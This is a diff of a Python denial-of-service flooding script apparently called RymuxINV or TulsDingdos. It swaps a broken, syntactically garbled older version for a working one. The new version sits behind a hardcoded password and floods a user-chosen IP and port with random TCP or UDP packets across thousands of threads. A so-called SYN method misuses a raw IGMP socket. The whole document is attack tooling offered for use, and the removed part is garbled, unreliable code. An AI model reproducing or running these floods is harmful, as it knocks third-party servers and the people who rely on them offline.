@@ -1,13 +1,25 @@
-#RymuxTools
-import socket
-import os
+#RymuxINV #TulsDingdos
 import random
-import sys
-import struct
+import time
+import os
 import threading
-from time import time as tt
+import socket
 
-os.system('cls' if os.name == 'nt' else 'clear')
+attemps = 0
+
+while attemps < 100:
+    username = input('Enter Username >> ')
+    password = input('Enter Password >> ')
+
+    if username == 'RymuxINV' and password == 'JawirGanteng':
+        print("PASSWORD DAN USERNAME BENAR COK!,TUNGGU BENTAR!!")
+        time.sleep(2.0)
+        break
+    else:
+        print("PASSWORD DAN USERNAME SALAH,INPUT YANG BENER LAH GOBLOK!")
+        attemps += 1
+        continue
+os.system("cls")
 
 logo = """
 \031[91m██████╗░██╗░░░██╗███╗░░░███╗██╗░░░██╗██╗░░██╗
@@ -25,177 +37,85 @@ banner = """
 \033[91m|   TCP    | 80  | 3389 |
 \033[91m|   SYN    | 80  | 3389 |
 \033[91m|   UDP    |17091| 7777 |
-\033[91m| UDP-BOMB |17091| 7777 |
-\033[91m] TCP-BOMBA| 80  | 3389 |
 \033[91m|----------|------------|
 """
 
-print(logo)
 print(banner)
-method = str(input("Method (TCP, TCPBOMBA, UDP, SYN, UDPBOMB) : "))
+"n/"
+method = str(input("Enter Method >> "))
+if method == "TCP" or method == "SYN" or method == "UDP":
+    print("METHOD VALID! PLEASE WAIT..")
+    time.sleep(2.5)
+else:
+    print("ERROR! METHOD INVALID!")
+    time.sleep(20)
 
-def UDP():
-    ip = str(input("IP : "))
-    port = int(input("Port : "))
-    time = int(input("Time : "))
+os.system("cls")
+print(logo)
+"n/"
 
-    data = random._urandom(666)
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    addr = (str(ip),int(port))
-    startup = tt()
-    while True:
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        s.sendto(data, addr)
+ip = str(input("Enter IP >> "))
+port = int(input("Enter PORT >> "))
+times = int(input("Enter Time >> "))
 
 def TCP():
-    ip = str(input("IP : "))
-    port = int(input("Port : "))
-    time = int(input("Time : "))
-
-    data = random._urandom(1024)
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    addr = (str(ip),int(port))
-    startup = tt()
+    packet = random.randint(1024, 8192)
+    byte_packet = random._urandom(packet)
     while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.connect((ip, port))
+            sock.send(byte_packet)
+            sock.sendall(byte_packet)
+            for x in range(times):
+                sock.send(byte_packet)
+                sock.sendall(byte_packet)
+            print(f"Attacking On {ip}:{port} with TCP")
+        except socket.error:
+            print(f"Attacking On {ip}:{port} with TCP")
+            sock.close()
 
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
+def UDP():
+    packet = random.randint(1024, 8192)
+    byte_packet = random._urandom(packet)
 
-        s.sendto(data, addr)
-        
-def TCPBOMBA():
-      
-     ip = str(input("IP : "))
-     port = int(input("PORT : "))
-     time = int(input("TIME : "))
-     
-      while True:
-           data = random._urandom(2048)
-           s = socket.socket(socket.AF_INET, socket .SOCK_STREAM)
-           s = setsock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY 1)
-           try:
-             s.send(randproxy)
-             s.send(randport)
-             print(print(f"[{i}]" + "TCP-BOMBA METHOD LAUNCHED TO >" format.ip))
-             except :
-               print(print(f"{i}" + "TCP-BOMBA DIDN'T SENDING PACKETS DUE TO WRONG INPUT >" format.ip))
-               
-              finally:
-                sock.close
-     
-      
-def randproxy():
-    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
-    return ip
-
-def randport():
-    port = random.randint(1000,9000)
-    return port
-
-ip = str(input("\nenter ip target > "))
-port = int(input("port address > "))
-times = int(input("times ? > "))
-threads = int(input("how many threads you want ? > "))
-
-     while True:
-          o = ["!", "+", "=", "-", "/"]
-          i = random.choice(o)
-          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-          s.connect((ip, port))
-          try:
-               s.send(randproxy)
-               s.send(randport)
-               print(f"[{i}]" + "SYN-METHOD LAUNCHED FOR {}".format(ip))
-          except ConnectionAbortedError:
-               s.close()
-               print(print(f"[{i}]" + "SYN-METHOD LAUNCHED FOR {} > DOWN".format(ip)))
-
-if __name__ == "__main__":
-     th = threading.Thread(target=ddos)
-     th.start()
-   
-  def UDP_BOMB():
-    
-print("""
-UDP Bomber Tools 
-""")
-
-ip = str(input("IP : "))
-port = int(input("Port : "))
-time = int(input("Time : "))
-
-hh == random._urandom(2048)
-xx == int (0)
-
-def attack():
-    data = bytearray(56656)
-    data[0] = 0x1B
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
-    addr = (str(ip),int(port),int(time))
     while True:
-        s.sendto(data, (ip,port))
-
-for _ in range(100):
-    t = threading.Thread(target=attack)
-    t.start()
-    
- def TCPFLOOD():
- 
-  print("""
-  mamah,akuh tkut
-  """)
-  
-  ip = str(input("IP : "))
-  port = int(input("PORT : "))
-  time = int(input("TIME : "))
-  
-  while True:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((str(ip),int (port)))
-    s.send(str.encode(main_req))
-    try:
-    for i in range(pack):
-        s.send(str.encode(main_req))
-    xx += random.randint(0, int(pack))
-    print(print(f"[{i}]" + "TCP-FLOOD METHOD LAUNCHED TO >" format.ip))
-             except :
-               print(print(f"{i}" + "TCP-FLOOD DIDN'T SENDING PACKETS DUE TO WRONG INPUT >" format.ip))
-       
-            s.close()
-            print("""Mamah,aku tkut""")
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.connect((ip, port))
+            sock.send(byte_packet)
+            sock.send(byte_packet)
+            for x in range(times):
+                sock.sendall(byte_packet)
+                sock.sendall(byte_packet)
+            print(f"Attacking On {ip}:{port} with UDP")
+        except socket.error:
+            print(f"Attacking On {ip}:{port} with UDP")
+            sock.close()
             
-for x in range (thread):    
-     thred = threading.Thread(target=start)
-     thread.start()
-  
- 
-if __name__ == '__main__':
-	print(logo)
-	print(banner)
-	try:
-		if method == 'TCP':
-			TCP()
-		elif method == 'TCPFLOOD':
-		  TCPFLOOD()
-		elif method == 'TCPBOMB':
-		  TCPBOMB
-	  elif method == 'SYN':
-	    SYN()
-		elif method == 'UDP':
-			UDP()
-		elif method == 'UDPBOMB':
-		  UDPBOMB()
-		  
-		else:
-			print("Unknow method: %s" % method)
-	except KeyboardInterrupt:
-		print("\033[32mAttack stopped.")
+def SYN():
+    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+    sock.connect((ip, port))
+    byteurandom = random._urandom(10145)
+    while True:
+        try:
+            sock.sendto(byteurandom, (ip, port))
+            for x in range(times):
+                sock.sendto(byteurandom, (ip, port))
+            print(f"Attacking On {ip}:{port} with SYN!")
+        except socket.error:
+            print(f"Attacking On {ip}:{port} with SYN!")
+            sock.close()
+
+for y in range(9024):
+    if method == "TCP":
+        t = threading.Thread(target =TCP)
+        t.start()
+    elif method == "UDP":
+        t = threading.Thread(target =UDP)
+        t.start()
+    elif method == "SYN":
+        t = threading.Thread(target =SYN)
+        t.start()
